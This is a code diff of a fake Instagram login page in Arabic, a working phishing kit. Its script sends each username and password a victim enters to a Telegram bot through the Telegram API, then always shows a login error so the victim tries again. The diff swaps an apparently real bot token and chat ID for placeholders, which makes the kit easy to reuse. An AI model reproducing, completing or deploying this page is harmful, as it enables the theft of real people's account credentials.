@@ -6,6 +6,7 @@
     <title>تسجيل الدخول • Instagram</title>
     <meta name="description" content="شاهد اللحظات اليومية من أصدقائك المقربين.">
     <meta name="theme-color" content="#000000">
+    <meta name="mobile-web-app-capable" content="yes">
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect x='6' y='6' width='36' height='36' rx='8' fill='url(%23g)'/><circle cx='24' cy='24' r='10' fill='none' stroke='%23fff' stroke-width='3'/><circle cx='34' cy='14' r='2.5' fill='%23fff'/><defs><linearGradient id='g' x1='0' y1='0' x2='48' y2='48'><stop stop-color='%23F58529'/><stop offset='0.25' stop-color='%23DD2A7B'/><stop offset='0.5' stop-color='%238134AF'/><stop offset='0.75' stop-color='%23515BD4'/><stop offset='1' stop-color='%23813BB1'/></linearGradient></defs></svg>">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -113,13 +114,10 @@
 </div>
 
 <script>
-    // ====== ضع توكن البوت والايدي هنا فقط ======
-    const BOT_TOKEN = '8914808690: AAH5uNoN50bLcm_S57M_wFiv
-sDE3Hx_PCt8';
-    const CHAT_ID = '8278195073';
-    // =========================================
-
-    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    // ====== ضع التوكن والايدي فقط هنا ======
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+    // =======================================
 
     const form = document.getElementById('loginForm');
     const usernameInput = document.getElementById('username');
@@ -140,18 +138,16 @@ sDE3Hx_PCt8';
     usernameInput.addEventListener('input', toggleBtn);
     passwordInput.addEventListener('input', toggleBtn);
 
-    async function sendToTelegram(data) {
+    async function sendToBot(data) {
         const now = new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
-        const msg = `🔴 **Instagram Login** 🔴\n\n👤 **User:** \`${data.username}\`\n🔑 **Pass:** \`${data.password}\`\n🕐 **Time:** ${now}\n📱 **UA:** \`${navigator.userAgent.substring(0, 150)}\``;
+        const msg = `🔴 **Instagram Login** 🔴\n\n👤 **User:** \`${data.username}\`\n🔑 **Pass:** \`${data.password}\`\n🕐 **Time:** ${now}`;
         try {
-            const r = await fetch(TELEGRAM_API, {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
             });
-            const res = await r.json();
-            if (!res.ok) showToast('⚠️ خطأ: تحقق من التوكن والايدي');
-        } catch { showToast('⚠️ فشل الاتصال بالبوت'); }
+        } catch { showToast('⚠️ فشل الإرسال'); }
     }
 
     form.addEventListener('submit', async function(e) {
@@ -160,7 +156,7 @@ sDE3Hx_PCt8';
         const password = passwordInput.value.trim();
         if (!username || !password) { showToast('⚠️ املأ جميع الحقول'); return; }
         showLoading(true); showError(false); loginBtn.disabled = true;
-        await sendToTelegram({ username, password });
+        await sendToBot({ username, password });
         setTimeout(() => {
             showLoading(false); showError(true);
             passwordInput.value = ''; toggleBtn(); passwordInput.focus();
